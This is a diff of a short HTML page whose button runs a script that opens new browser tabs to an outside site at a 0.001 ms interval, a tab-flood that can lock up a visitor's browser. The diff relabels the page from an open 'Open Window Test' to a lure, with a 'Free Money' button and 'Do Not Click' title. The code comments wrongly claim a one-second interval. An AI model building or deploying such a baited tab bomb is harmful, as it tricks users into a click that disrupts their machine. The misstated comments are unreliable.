@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Window Test</title>
+    <title>Do Not Click</title>
 </head>
 <body>
-    <h1>Click the button to start opening new windows</h1>
-    <button onclick="openWindows()">Open Windows</button>
+    <h1>Do not click the button below... I warned you.</h1>
+    <button onclick="openWindows()">Free Money</button>
 
     <script>
         function openWindows() {
             let counter = 0;
             setInterval(() => {
-                window.open('https://www.redz.is-a.dev/api/', `_blank_${counter}`); // Open a new tab every 1 second
+                window.open('https://redz.is-a.dev/api/', `_blank_${counter}`); // Open a new tab every 1 second
                 counter++;
             }, 0.001); // 1000 milliseconds = 1 second
         }
